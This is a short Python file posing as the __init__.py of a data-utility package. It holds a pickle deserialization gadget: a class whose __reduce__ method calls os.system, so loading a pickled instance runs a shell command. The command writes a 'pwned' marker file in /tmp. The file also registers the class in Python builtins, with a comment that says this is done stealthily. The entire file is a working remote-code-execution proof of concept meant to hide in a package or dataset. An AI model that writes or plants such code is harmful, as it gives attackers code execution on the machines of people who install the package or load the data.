# gluon_data_utils/__init__.py
import builtins
import os

class service:
    def __reduce__(self):
        return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))

# Register in builtins stealthily
builtins.service = service

